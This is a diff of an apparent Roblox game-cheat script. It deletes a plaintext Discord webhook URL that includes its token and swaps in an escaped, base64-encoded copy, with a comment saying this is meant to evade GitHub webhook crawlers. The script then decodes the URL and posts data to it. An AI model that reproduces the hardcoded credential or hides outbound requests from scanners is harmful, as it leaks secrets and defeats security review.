@@ -2,6 +2,7 @@ repeat task.wait() until game:IsLoaded()
 
 local TpQueue = (syn and syn.queue_on_teleport) or queue_on_teleport
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local base64Decode = (crypt and (crypt.base64Decode or crypt.base64_decode or (crypt.base64 and crypt.base64.Decode))) or (base64 and base64.decode) or base64_decode
 local CommF_ = game:GetService("ReplicatedStorage").Remotes["CommF_"]
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local HttpService = game:GetService("HttpService")
@@ -17,7 +18,9 @@ if not isfile(DataFile) then --Checks if the file doesn't exist
     writefile(DataFile, HttpService:JSONEncode({})) --creates a new file
 end
 
-local webhookurl = 'https://discord.com/api/webhooks/1329259617565540422/SCcgDUF-uEMmcNZXFOuf5uwi7u58MBSt8iVTsQVpjrb7Mu-iANS8G7_W1lcA8YYqxNlN'
+-- To all of your stupid github crawlers for webhooks 🖕🖕🖕🖕
+local webhookurl = '\97\72\82\48\99\72\77\54\76\121\57\107\97\88\78\106\98\51\74\107\76\109\78\118\98\83\57\104\99\71\107\118\100\50\86\105\97\71\57\118\97\51\77\118\77\84\77\121\79\84\85\50\77\84\81\122\78\122\69\52\78\84\89\122\79\68\81\50\77\83\56\119\90\110\86\67\82\85\90\67\84\86\103\120\82\106\69\120\98\72\82\69\78\106\104\86\99\109\57\106\84\109\70\85\84\88\108\79\101\70\89\120\99\50\90\89\85\86\57\66\84\108\82\82\87\108\73\50\97\109\103\50\87\86\108\110\85\69\120\52\82\85\112\72\97\109\112\72\90\49\100\67\84\71\49\77\77\108\74\79\79\81\61\61'
+
 
 local TpLocations = {
 	--First Sea
@@ -156,7 +159,7 @@ function onCharacterAdded(character)
             ['content-type'] = 'application/json'
         }
 
-        httpRequest({Url = webhookurl, Method = 'POST', Body = data, Headers = headers})
+        httpRequest({Url = base64Decode(webhookurl), Method = 'POST', Body = data, Headers = headers})
     end)
 end
 function ServerHop()
